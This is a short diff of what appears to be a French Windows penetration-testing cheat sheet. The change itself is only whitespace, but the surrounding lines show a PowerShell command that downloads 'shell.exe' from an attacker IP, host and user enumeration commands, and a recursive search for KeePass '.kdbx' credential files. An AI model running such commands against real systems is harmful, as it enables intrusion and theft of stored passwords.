@@ -9,7 +9,7 @@ Ou alors: (new-object System.Net.WebClient).DownloadFile('http://[IP]/shell.exe'
 **Information systeme:** systeminfo  
 **Lister les infos d'un user:** net user [user]  
 **Lister quel groupe / user ont accès au fichier:** icacls [fichier]  
-**Lister process:** Get-Process | ForEach-Object {$_.Path}
+**Lister process:** Get-Process | ForEach-Object {$_.Path}  
 **Trouver des fichiers (équivalent find):** Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
 ## Partage Samba:
